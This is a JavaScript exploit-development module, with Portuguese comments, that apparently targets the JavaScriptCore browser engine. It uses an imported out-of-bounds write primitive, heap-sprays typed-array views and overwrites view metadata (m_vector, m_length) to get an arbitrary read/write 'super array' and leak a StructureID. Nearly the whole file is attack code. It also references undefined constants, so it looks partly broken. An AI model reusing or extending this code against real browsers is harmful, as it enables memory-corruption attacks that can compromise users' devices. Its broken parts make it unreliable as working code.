// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.20";

const CORRUPTION_OFFSET_TRIGGER = 0x70; // Onde escrevemos 0xFFFFFFFF_FFFFFFFF
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Offsets dentro do oob_array_buffer_real onde esperamos que os metadados
// de uma view pulverizada possam ser influenciados ou onde plantaremos.
const HYPOTHETICAL_VIEW_METADATA_START_OFFSET = 0x58;
const MVECTOR_TARGET_ADDR_IN_OOB = HYPOTHETICAL_VIEW_METADATA_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x68
const MLENGTH_TARGET_ADDR_IN_OOB = HYPOTHETICAL_VIEW_METADATA_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x70

// Valores para plantar/corromper
const TARGET_MVECTOR_VALUE  = AdvancedInt64.Zero; // m_vector = 0
const TARGET_MLENGTH_VALUE  = 0xFFFFFFFF;         // m_length = max

// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.20)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.directCorruptionAndSuperArrayTest_v10.20`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Corrupção Direta de Bytes e Teste de SuperArray ---`, "test", FNAME_CURRENT_TEST);

    const NUM_SPRAY_VIEWS = 200;
    const SPRAY_VIEW_ELEMENT_COUNT = 8;

    let sprayedVictimViews = [];
    let superArray = null;
    let superArrayIndex = -1;

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            throw new Error("OOB Init falhou.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // 1. Heap Spraying: Criar VIEWS sobre o oob_array_buffer_real
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_VIEWS} Uint32Array views sobre oob_array_buffer_real...`, "info", FNAME_CURRENT_TEST);
        let current_data_offset_for_view = (OOB_CONFIG.BASE_OFFSET_IN_DV || 0) + 0x800;
        for (let i = 0; i < NUM_SPRAY_VIEWS; i++) {
            if (current_data_offset_for_view + (SPRAY_VIEW_ELEMENT_COUNT * 4) > oob_array_buffer_real.byteLength) break;
            try {
                let view = new Uint32Array(oob_array_buffer_real, current_data_offset_for_view, SPRAY_VIEW_ELEMENT_COUNT);
                view[0] = (0xFACE0000 | i); // Marcador nos DADOS da view
                sprayedVictimViews.push(view);
                current_data_offset_for_view += (SPRAY_VIEW_ELEMENT_COUNT * 4) + 0x80; // Espaçar bem os dados
            } catch (e_spray) { break; }
        }
        logS3(`Pulverização de ${sprayedVictimViews.length} views concluída.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(300);

        // 2. Corromper diretamente os bytes em MVECTOR_TARGET_ADDR_IN_OOB (0x68) e MLENGTH_TARGET_ADDR_IN_OOB (0x70)
        //    dentro do oob_array_buffer_real.
        //    A hipótese é que os metadados de uma das sprayedVictimViews[i] (que estão na heap principal)
        //    sejam corrompidos para *usar* estes valores, ou que uma delas seja alocada
        //    com seus metadados sobrepondo esta área do oob_array_buffer_real.

        logS3(`FASE 2: Corrompendo bytes em ${toHex(MVECTOR_TARGET_ADDR_IN_OOB)} e ${toHex(MLENGTH_TARGET_ADDR_IN_OOB)} no oob_array_buffer_real...`, "info", FNAME_CURRENT_TEST);
        
        // Plantar o que queremos para m_vector (0x68)
        // A "mágica" anterior era: plantar X em 0x6C.low -> 0x68.high se torna X, 0x68.low se torna 0.
        // Para ter m_vector (QWORD @ 0x68) = 0:
        // Plantar 0 em 0x6C.low -> 0x68.high se torna 0.
        // E precisamos que 0x68.low seja 0.
        oob_write_absolute(PLANT_OFFSET_0x6C, AdvancedInt64.Zero, 8); // Planta 0 em 0x6C (influencia 0x68.high)
        oob_write_absolute(MVECTOR_TARGET_ADDR_IN_OOB, 0, 4);        // Garante que 0x68.low seja 0

        // Acionar a corrupção em 0x70 (MLENGTH_TARGET_ADDR_IN_OOB) para definir m_length e m_mode
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        await PAUSE_S3(100);

        // Verificar os bytes no oob_array_buffer_real
        const val_mvec = oob_read_absolute(MVECTOR_TARGET_ADDR_IN_OOB, 8);
        const val_mlen = oob_read_absolute(MLENGTH_TARGET_ADDR_IN_OOB, 4);
        logS3(`  Bytes em oob_array_buffer_real: mvec@${toHex(MVECTOR_TARGET_ADDR_IN_OOB)}=${val_mvec.toString(true)}, mlen@${toHex(MLENGTH_TARGET_ADDR_IN_OOB)}=${toHex(val_mlen)}`, "info", FNAME_CURRENT_TEST);

        if (!(val_mvec.isZero() && val_mlen === TARGET_MLENGTH_VALUE)) {
            logS3("    AVISO: Os bytes em 0x68/0x70 não foram definidos como esperado (m_vector=0, m_length=MAX).", "warn", FNAME_CURRENT_TEST);
        } else {
            logS3("    Bytes em 0x68/0x70 foram definidos para m_vector=0, m_length=MAX com sucesso.", "good", FNAME_CURRENT_TEST);
        }

        // 3. Tentar Identificar e Usar o "Super Array" (View)
        logS3(`FASE 3: Tentando identificar uma "Super View" entre as ${sprayedVictimViews.length} pulverizadas...`, "info", FNAME_CURRENT_TEST);
        const MARKER_VALUE_TO_WRITE = 0x99887766;
        const MARKER_TEST_OFFSET_IN_OOB_BUFFER = 0xC0; 
        const MARKER_TEST_INDEX_IN_VIEW = MARKER_TEST_OFFSET_IN_OOB_BUFFER / 4;

        let original_value_at_marker_offset = 0;
        try { original_value_at_marker_offset = oob_read_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, 4); } catch(e){}

        oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, MARKER_VALUE_TO_WRITE, 4);
        logS3(`  Marcador ${toHex(MARKER_VALUE_TO_WRITE)} escrito em oob_buffer[${toHex(MARKER_TEST_OFFSET_IN_OOB_BUFFER)}]`, "info", FNAME_CURRENT_TEST);

        for (let i = 0; i < sprayedVictimViews.length; i++) {
            try {
                // Se os metadados de sprayedVictimViews[i] (que estão na heap JS) foram corrompidos
                // para usar m_vector=0 (relativo ao seu ArrayBuffer, que é oob_array_buffer_real)
                // e m_length=MAX, então esta leitura deve funcionar.
                if (sprayedVictimViews[i][MARKER_TEST_INDEX_IN_VIEW] === MARKER_VALUE_TO_WRITE) {
                    logS3(`    !!!! SUPER ARRAY (VIEW) POTENCIALMENTE ENCONTRADO !!!! sprayedVictimViews[${i}] (marcador de dados inicial: ${toHex(sprayedVictimViews[i][0])})`, "vuln", FNAME_CURRENT_TEST);
                    superArray = sprayedVictimViews[i];
                    superArrayIndex = i;
                    document.title = `SUPER VIEW[${i}] ATIVA!`;
                    break; 
                }
            } catch (e_access) { /* Ignora erros de acesso */ }
        }
        try {oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, original_value_at_marker_offset, 4); } catch(e){}

        if (superArray) {
            logS3(`    Primitiva de Leitura/Escrita via 'superArray' (sprayedVictimViews[${superArrayIndex}]) parece funcional!`, "vuln", FNAME_CURRENT_TEST);
            logS3(`      superArray.length (JS): ${superArray.length}`, "info", FNAME_CURRENT_TEST); // O .length JS pode ser diferente do m_length interno.
            
            // Com o superArray, TENTAR LER O STRUCTUREID DO OBJETO EM 0x58
            const sid_read_addr = HYPOTHETICAL_VIEW_METADATA_START_OFFSET + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
            if (sid_read_addr % 4 === 0) {
                const sid_val_from_super = superArray[sid_read_addr / 4];
                logS3(`      LIDO COM SUPERARRAY: StructureID em ${toHex(HYPOTHETICAL_VIEW_METADATA_START_OFFSET)} é ${toHex(sid_val_from_super)}`, "leak", FNAME_CURRENT_TEST);
                if (sid_val_from_super !== 0 && sid_val_from_super !== 0xFFFFFFFF && (sid_val_from_super & 0xFFFF0000) !== 0xCAFE0000) {
                     EXPECTED_UINT32ARRAY_STRUCTURE_ID = sid_val_from_super;
                     logS3(`        >>>> POTENCIAL STRUCTUREID REAL DESCOBERTO: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} <<<< ATUALIZE A CONSTANTE!`, "vuln", FNAME_CURRENT_TEST);
                     document.title = `SUPERVIEW SID=${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
                }
            }
        } else {
            logS3("    Não foi possível identificar a 'superArray' (View) específica via teste de marcador.", "warn", FNAME_CURRENT_TEST);
        }
        logS3("INVESTIGAÇÃO CONCLUÍDA.", "test", FNAME_CURRENT_TEST);

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedVictimViews = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
